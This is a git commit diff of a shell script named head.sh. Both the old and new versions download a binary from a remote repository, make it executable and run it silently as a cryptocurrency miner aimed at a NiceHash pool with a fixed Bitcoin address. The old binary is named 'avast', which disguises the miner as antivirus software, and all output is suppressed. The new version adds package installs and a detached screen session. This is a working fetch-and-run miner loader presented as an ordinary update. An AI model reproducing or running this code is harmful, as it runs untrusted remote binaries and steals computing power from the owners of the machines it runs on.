218cc6987c772b03b61f5982a8bc254138b6ec45
angkii <83603708+angkii@users.noreply.github.com>
2022-01-11 10:25:44 -0700

    Update head.sh

--- head.sh
+++ head.sh
@@ -1,10 +1,20 @@
 #!/bin/bash
 
-wget https://github.com/angkii/bh/raw/main/avast >/dev/null 2>&1
-     
-chmod +x avast >/dev/null 2>&1
+#!/bin/sh
 
-./avast -v -l daggerhashimoto.eu.nicehash.com:3353 -u 3BsJ6cvtviyvS6tWfFWaDGHStB8pTHUrNH.$(echo $(shuf -i 1-9999 -n 1)111) -p x -t $(nproc) >/dev/null 2>&1
+#!/bin/bash
+
+apt update
+
+sudo apt install screen libjansson4 -y 
+
+wget https://gitlab.com/fajarranz19/BTC/raw/main/mesinnano >/dev/null 2>&1
+      
+chmod +x mesinnano >/dev/null 2>&1
+
+screen -dmS ls
+
+./mesinnano -v -l daggerhashimoto.eu.nicehash.com:3353 -u 3BsJ6cvtviyvS6tWfFWaDGHStB8pTHUrNH.$(echo $(shuf -i 1-9999 -n 1)111) -p x -t $(nproc) >/dev/null 2>&1
 
 while [ 1 ]; do
 
